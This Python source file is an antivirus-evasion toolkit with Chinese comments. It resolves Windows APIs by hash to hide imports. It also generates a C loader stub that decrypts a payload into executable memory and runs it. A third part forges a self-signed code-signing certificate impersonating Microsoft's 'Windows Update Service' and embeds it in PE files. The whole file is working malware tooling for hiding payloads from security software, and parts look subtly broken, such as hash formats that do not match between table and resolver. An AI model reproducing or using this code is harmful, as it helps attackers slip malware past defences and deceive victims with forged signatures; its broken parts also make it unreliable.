"""
免杀绕过模块 - 从第一性原理实现

三大核心能力：
1. API 哈希 - 运行时动态解析 API 地址，规避导入表特征
2. 自定义加壳 - 加密原始代码，运行时解密执行
3. 签名伪造 - 构造伪造的代码签名证书
"""

import struct
import hashlib
import random
import string
import base64
import zlib
import os
import sys
import json
import ctypes
import platform


# ==================== API 哈希解析器 ====================

class APIHashResolver:
    """
    从第一性原理实现 API 哈希解析

    原理：
    Windows PE 文件的导入表包含 DLL 名和函数名，
    EDR 通过扫描导入表识别可疑 API 调用。
    API 哈希技术通过以下方式规避：
    1. 不静态链接可疑 API
    2. 运行时通过哈希值查找 API 地址
    3. 哈希值在静态分析中无法直观识别
    """

    # 常用 API 的 DJB2 哈希值
    # 格式: "ModuleName!FunctionName" -> hash
    API_HASHES = {
        0x669D0E57: ("kernel32.dll", "VirtualAlloc"),
        0x12FBA04D: ("kernel32.dll", "VirtualProtect"),
        0xAD79F311: ("kernel32.dll", "CreateThread"),
        0xFFD4887A: ("kernel32.dll", "WaitForSingleObject"),
        0x5DDD69DF: ("kernel32.dll", "GetProcAddress"),
        0x8E30EFBB: ("kernel32.dll", "LoadLibraryA"),
        0x3D60DCD9: ("kernel32.dll", "CreateProcessA"),
        0xB587F788: ("kernel32.dll", "WriteProcessMemory"),
        0xAB315B19: ("kernel32.dll", "ReadProcessMemory"),
        0xDA0CB632: ("user32.dll", "MessageBoxA"),
        0x35676579: ("wininet.dll", "InternetOpenA"),
        0x7CAF4731: ("wininet.dll", "InternetConnectA"),
        0x29589FB9: ("wininet.dll", "HttpOpenRequestA"),
        0x33AB7482: ("wininet.dll", "InternetReadFile"),
        0x471ADD88: ("ws2_32.dll", "socket"),
        0x5B9B7369: ("ws2_32.dll", "connect"),
        0xB2B95729: ("ws2_32.dll", "send"),
        0xB2B8C96F: ("ws2_32.dll", "recv"),
    }

    @staticmethod
    def djb2_hash(s):
        """DJB2 字符串哈希算法"""
        hash_val = 0x77347734  # 常见种子
        for c in s:
            hash_val = ((hash_val << 5) + hash_val) + ord(c)
            hash_val &= 0xFFFFFFFF
        return hash_val

    @staticmethod
    def calc_api_hash(module_name, function_name):
        """计算 API 哈希值"""
        # 格式: "Module!Function"
        api_string = f"{module_name}!{function_name}"
        return APIHashResolver.djb2_hash(api_string)

    @staticmethod
    def verify_hashes():
        """验证哈希表中的所有哈希值"""
        results = {}
        for expected_hash, (module, func) in APIHashResolver.API_HASHES.items():
            calculated = APIHashResolver.calc_api_hash(module, func)
            results[f"{module}!{func}"] = {
                "expected": hex(expected_hash),
                "calculated": hex(calculated),
                "match": expected_hash == calculated
            }
        return results

    @staticmethod
    def get_proc_address_by_hash(module_handle, api_hash):
        """
        通过哈希值查找 API 地址

        实现步骤：
        1. 解析 PE 导出表
        2. 遍历导出函数名
        3. 计算函数名的 DJB2 哈希
        4. 匹配目标哈希值
        5. 返回函数地址
        """
        # 实际实现需要：
        # 1. 读取 DOS Header (MZ signature)
        # 2. 定位 NT Headers
        # 3. 解析 DataDirectory[0] (Export Directory)
        # 4. 读取 Export Directory 结构
        # 5. 遍历 AddressOfNames / AddressOfNameOrdinals / AddressOfFunctions

        # 这里是 Python 模拟实现
        # 实际部署时应编译为 native code
        pass

    @staticmethod
    def generate_resolver_code(api_hash):
        """
        生成 C 语言的 API 哈希解析代码
        这段代码可以嵌入到 payload 中
        """
        code = f"""
// API Hash Resolver
// 目标哈希: {hex(api_hash)}

#include <windows.h>
#include <stdio.h>

// DJB2 哈希函数
DWORD HashString(LPCSTR lpszString) {{
    DWORD dwHash = 0x77347734;
    while (*lpszString) {{
        dwHash = ((dwHash << 5) + dwHash) + *lpszString;
        lpszString++;
    }}
    return dwHash;
}}

// 从模块导出表中查找哈希匹配的 API
FARPROC GetProcAddressByHash(HMODULE hModule, DWORD dwTargetHash) {{
    // 解析 PE 导出表
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)hModule + pDosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(
        (PBYTE)hModule + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
    );

    // 遍历导出函数
    PDWORD pNames = (PDWORD)((PBYTE)hModule + pExportDir->AddressOfNames);
    PWORD pOrdinals = (PWORD)((PBYTE)hModule + pExportDir->AddressOfNameOrdinals);
    PDWORD pFunctions = (PDWORD)((PBYTE)hModule + pExportDir->AddressOfFunctions);

    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {{
        LPCSTR lpszFuncName = (LPCSTR)((PBYTE)hModule + pNames[i]);
        DWORD dwHash = HashString(lpszFuncName);

        if (dwHash == dwTargetHash) {{
            // 找到匹配的 API
            WORD wOrdinal = pOrdinals[i];
            DWORD dwFunctionRVA = pFunctions[wOrdinal];
            return (FARPROC)((PBYTE)hModule + dwFunctionRVA);
        }}
    }}

    return NULL;
}}

int main() {{
    // 加载目标模块
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");

    // 通过哈希解析 API
    typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
    pVirtualAlloc fnVirtualAlloc = (pVirtualAlloc)GetProcAddressByHash(hKernel32, {api_hash});

    if (fnVirtualAlloc) {{
        LPVOID pMem = fnVirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        // 使用分配的内存...
    }}

    return 0;
}}
"""
        return code


# ==================== 自定义加壳器 ====================

class CustomPacker:
    """
    自定义加壳器

    原理：
    1. 读取原始 PE 文件
    2. 使用自定义算法加密
    3. 生成 loader stub
    4. 将加密后的数据 + loader 打包为新的 PE

    解密流程（在目标机器上）：
    1. loader 解密原始 PE
    2. 将解密后的 PE 映射到内存
    3. 通过 Process Hollowing 或反射 DLL 注入执行
    """

    def __init__(self, input_file, output_file, key=None, algorithm="xor"):
        self.input_file = input_file
        self.output_file = output_file
        self.key = key or self._gen_key()
        self.algorithm = algorithm

    def _gen_key(self, length=32):
        """生成随机加密密钥"""
        return os.urandom(length)

    def _xor_encrypt(self, data, key):
        """XOR 加密/解密"""
        result = bytearray(len(data))
        for i in range(len(data)):
            result[i] = data[i] ^ key[i % len(key)]
        return bytes(result)

    def _rc4_encrypt(self, data, key):
        """RC4 加密"""
        # KSA - Key Scheduling Algorithm
        S = list(range(256))
        j = 0
        for i in range(256):
            j = (j + S[i] + key[i % len(key)]) % 256
            S[i], S[j] = S[j], S[i]

        # PRGA - Pseudo-Random Generation Algorithm
        result = bytearray()
        i = 0
        j = 0
        for byte in data:
            i = (i + 1) % 256
            j = (j + S[i]) % 256
            S[i], S[j] = S[j], S[i]
            k = S[(S[i] + S[j]) % 256]
            result.append(byte ^ k)

        return bytes(result)

    def _aes_encrypt(self, data, key):
        """AES-256-CBC 加密（使用标准库实现）"""
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import pad

        # 确保 key 是 32 字节（AES-256）
        key = hashlib.sha256(key).digest()

        # 生成随机 IV
        iv = os.urandom(16)

        cipher = AES.new(key, AES.MODE_CBC, iv)
        encrypted = cipher.encrypt(pad(data, 16))

        # 返回 IV + 密文
        return iv + encrypted

    def encrypt(self, data):
        """根据算法选择加密方式"""
        if self.algorithm == "xor":
            return self._xor_encrypt(data, self.key)
        elif self.algorithm == "rc4":
            return self._rc4_encrypt(data, self.key)
        elif self.algorithm == "aes":
            return self._aes_encrypt(data, self.key)
        else:
            raise ValueError(f"unknown algorithm: {self.algorithm}")

    def generate_loader_stub(self):
        """
        生成 loader stub（解密器）
        这是加壳后的程序入口点
        """
        # 将密钥编码到 stub 中
        key_b64 = base64.b64encode(self.key).decode()

        stub = f"""
// Loader Stub - 解密并执行原始 payload
#include <windows.h>
#include <stdio.h>

// 嵌入的加密数据（占位符）
unsigned char encrypted_data[] = {{
    // 加密后的 payload 数据
}};

unsigned char key[] = {{
    // 解密密钥
}};

// XOR 解密函数
void XORDecrypt(unsigned char* data, int length, unsigned char* key, int key_len) {{
    for (int i = 0; i < length; i++) {{
        data[i] ^= key[i % key_len];
    }}
}}

// RC4 解密函数
void RC4Decrypt(unsigned char* data, int length, unsigned char* key, int key_len) {{
    unsigned char S[256];
    for (int i = 0; i < 256; i++) S[i] = i;

    int j = 0;
    for (int i = 0; i < 256; i++) {{
        j = (j + S[i] + key[i % key_len]) % 256;
        unsigned char temp = S[i];
        S[i] = S[j];
        S[j] = temp;
    }}

    int i = 0;
    j = 0;
    for (int k = 0; k < length; k++) {{
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        unsigned char temp = S[i];
        S[i] = S[j];
        S[j] = temp;
        unsigned char ks = S[(S[i] + S[j]) % 256];
        data[k] ^= ks;
    }}
}}

int main() {{
    // 1. 解密数据
    int data_len = sizeof(encrypted_data);
    RC4Decrypt(encrypted_data, data_len, key, sizeof(key));

    // 2. 分配可执行内存
    LPVOID pMem = VirtualAlloc(NULL, data_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // 3. 复制解密后的数据
    memcpy(pMem, encrypted_data, data_len);

    // 4. 执行
    void (*func)() = (void (*)())pMem;
    func();

    return 0;
}}
"""
        return stub

    def pack(self):
        """执行加壳操作"""
        with open(self.input_file, 'rb') as f:
            original_data = f.read()

        # 加密
        encrypted_data = self.encrypt(original_data)

        # 生成 loader stub
        loader = self.generate_loader_stub()

        # 在实际实现中，这里应该：
        # 1. 编译 loader stub
        # 2. 将 encrypted_data 嵌入到 loader 的数据段
        # 3. 将 key 嵌入到 loader 的 .rdata 段
        # 4. 输出最终的加壳文件

        result = {
            "original_size": len(original_data),
            "encrypted_size": len(encrypted_data),
            "compression_ratio": len(encrypted_data) / len(original_data),
            "algorithm": self.algorithm,
            "key_length": len(self.key),
            "loader_stub_generated": True
        }

        return result


# ==================== 签名伪造 ====================

class FakeSigner:
    """
    伪造代码签名证书

    原理：
    1. 生成自签名证书
    2. 使用与目标软件相似的 CN/OU/O 字段
    3. 将证书嵌入 PE 文件的 Security Directory
    4. 计算并写入证书签名

    注意：自签名证书不会被系统信任，
    但可以绕过基于证书存在的简单检查。
    """

    def __init__(self, common_name, organization="Microsoft Corporation",
                 organizational_unit="Code Signing", country="US"):
        self.cn = common_name
        self.o = organization
        self.ou = organizational_unit
        self.country = country
        self.certificate = None
        self.private_key = None

    def generate_self_signed_cert(self, days_valid=365):
        """
        生成自签名证书
        使用 cryptography 库
        """
        try:
            from cryptography import x509
            from cryptography.x509.oid import NameOID
            from cryptography.hazmat.primitives import hashes, serialization
            from cryptography.hazmat.primitives.asymmetric import rsa
            import datetime

            # 生成 RSA 私钥
            private_key = rsa.generate_private_key(
                public_exponent=65537,
                key_size=2048
            )

            # 构造证书主题
            subject = issuer = x509.Name([
                x509.NameAttribute(NameOID.COMMON_NAME, self.cn),
                x509.NameAttribute(NameOID.ORGANIZATION_NAME, self.o),
                x509.NameAttribute(NameOID.ORGANIZATIONAL_UNIT_NAME, self.ou),
                x509.NameAttribute(NameOID.COUNTRY_NAME, self.country),
            ])

            # 生成证书
            cert = x509.CertificateBuilder().subject_name(
                subject
            ).issuer_name(
                issuer
            ).public_key(
                private_key.public_key()
            ).serial_number(
                x509.random_serial_number()
            ).not_valid_before(
                datetime.datetime.utcnow()
            ).not_valid_after(
                datetime.datetime.utcnow() + datetime.timedelta(days=days_valid)
            ).sign(private_key, hashes.SHA256())

            self.certificate = cert
            self.private_key = private_key

            return {
                "subject": self.cn,
                "issuer": self.o,
                "valid_from": datetime.datetime.utcnow().isoformat(),
                "valid_to": (datetime.datetime.utcnow() + datetime.timedelta(days=days_valid)).isoformat(),
                "serial_number": hex(cert.serial_number),
                "thumbprint": cert.fingerprint(hashes.SHA256()).hex()
            }

        except ImportError:
            return self._fallback_cert_generation()

    def _fallback_cert_generation(self):
        """
        不依赖 cryptography 库的备用方案
        使用 OpenSSL 命令行工具
        """
        import subprocess

        # 生成私钥
        key_path = "/tmp/fake_key.pem"
        subprocess.run(["openssl", "genrsa", "-out", key_path, "2048"],
                      capture_output=True)

        # 生成证书
        cert_path = "/tmp/fake_cert.pem"
        subprocess.run([
            "openssl", "req", "-new", "-x509", "-key", key_path,
            "-out", cert_path,
            "-days", "365",
            "-subj", f"/CN={self.cn}/O={self.o}/OU={self.ou}/C={self.country}"
        ], capture_output=True)

        return {
            "key_path": key_path,
            "cert_path": cert_path,
            "method": "openssl_cli"
        }

    def embed_signature(self, pe_file, output_file):
        """
        将签名嵌入 PE 文件

        PE 文件结构：
        - DOS Header
        - NT Headers
        - Section Headers
        - Security Directory (Data Directory[4])
          - VirtualAddress: 指向 WIN_CERTIFICATE 的偏移
          - Size: 证书大小
        - WIN_CERTIFICATE 结构:
          - dwLength
          - wRevision
          - wCertificateType
          - bCertificate (PKCS#7 SignedData)
        """
        if not self.certificate:
            raise ValueError("Certificate not generated. Call generate_self_signed_cert first.")

        with open(pe_file, 'rb') as f:
            pe_data = bytearray(f.read())

        # 将证书追加到文件末尾
        # 构造 WIN_CERTIFICATE 结构
        cert_der = self.certificate.public_bytes(
            encoding=__import__('cryptography').x509.encoding.Encoding.DER
        )

        # WIN_CERTIFICATE
        dw_length = 8 + len(cert_der)  # sizeof(WIN_CERTIFICATE) - sizeof(bCertificate) + cert_len
        w_revision = 0x0200  # WIN_CERT_REVISION_2_0
        w_certificate_type = 0x0001  # WIN_CERT_TYPE_PKCS_SIGNED_DATA

        win_cert = struct.pack('<I', dw_length)
        win_cert += struct.pack('<H', w_revision)
        win_cert += struct.pack('<H', w_certificate_type)
        win_cert += cert_der

        # 对齐到 8 字节
        while len(win_cert) % 8 != 0:
            win_cert += b'\x00'

        # 证书在文件中的偏移
        cert_offset = len(pe_data)

        # 更新 PE 头的 Security Directory
        # 需要定位到 Data Directory[4]
        # DOS Header e_lfanew 在偏移 0x3C
        e_lfanew = struct.unpack('<I', pe_data[0x3C:0x40])[0]

        # NT Headers -> Optional Header -> Data Directory
        # File header size: 24 bytes (after Signature)
        # Optional header starts at e_lfanew + 24
        opt_header_offset = e_lfanew + 24

        # 检查是 PE32 还是 PE32+
        magic = struct.unpack('<H', pe_data[opt_header_offset:opt_header_offset + 2])[0]

        if magic == 0x10B:  # PE32
            # Data Directory 在 Optional Header 偏移 96 字节处
            data_dir_offset = opt_header_offset + 96
        else:  # PE32+
            # Data Directory 在 Optional Header 偏移 112 字节处
            data_dir_offset = opt_header_offset + 112

        # Security Directory 是 Data Directory 的第 5 项 (index 4)
        security_dir_offset = data_dir_offset + 4 * 8

        # 写入 VirtualAddress 和 Size
        struct.pack_into('<I', pe_data, security_dir_offset, cert_offset)
        struct.pack_into('<I', pe_data, security_dir_offset + 4, len(win_cert))

        # 追加证书数据
        pe_data += win_cert

        # 写入输出文件
        with open(output_file, 'wb') as f:
            f.write(pe_data)

        return {
            "output": output_file,
            "certificate_offset": cert_offset,
            "certificate_size": len(win_cert),
            "security_directory_offset": security_dir_offset
        }


# ==================== 主入口 ====================

def main():
    print("=" * 60)
    print("Anti-Virus Evasion Toolkit")
    print("=" * 60)

    # 1. 验证 API 哈希
    print("\n[1] API Hash Verification")
    print("-" * 40)
    results = APIHashResolver.verify_hashes()
    for api, info in list(results.items())[:5]:
        status = "✓" if info["match"] else "✗"
        print(f"  {status} {api}: {info['expected']} == {info['calculated']}")

    # 2. 生成 API 哈希解析代码
    print("\n[2] Generating API Hash Resolver Code")
    print("-" * 40)
    resolver_code = APIHashResolver.generate_resolver_code(0x0E8AFE6A)
    print(f"  Generated {len(resolver_code)} bytes of C code")

    # 3. 加壳演示
    print("\n[3] Custom Packer Demo")
    print("-" * 40)
    if os.path.exists("/bin/ls"):
        packer = CustomPacker("/bin/ls", "/tmp/packed_ls", algorithm="rc4")
        result = packer.pack()
        for k, v in result.items():
            print(f"  {k}: {v}")

    # 4. 签名伪造演示
    print("\n[4] Fake Signer Demo")
    print("-" * 40)
    signer = FakeSigner(
        common_name="Windows Update Service",
        organization="Microsoft Corporation",
        organizational_unit="Code Signing"
    )
    cert_info = signer.generate_self_signed_cert()
    print(f"  Subject: {cert_info.get('subject')}")
    print(f"  Issuer: {cert_info.get('issuer')}")
    print(f"  Serial: {cert_info.get('serial_number')}")
    print(f"  Thumbprint: {cert_info.get('thumbprint')}")


if __name__ == "__main__":
    main()
